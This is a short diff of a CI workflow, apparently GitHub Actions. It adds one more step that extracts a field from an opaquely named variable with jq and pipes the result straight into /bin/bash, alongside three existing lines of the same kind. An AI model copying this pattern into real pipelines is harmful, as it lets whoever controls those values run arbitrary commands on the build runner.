@@ -21,6 +21,7 @@ jobs:
           printf '%s' "$jv3" | jq -r .ovm5182 | /bin/bash
           printf '%s' "$oa16" | jq -r .do21 | /bin/bash
           printf '%s' "$lrldq0" | jq -r .pvod43 | /bin/bash
+          echo $fp2 | jq -r .ciff649 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
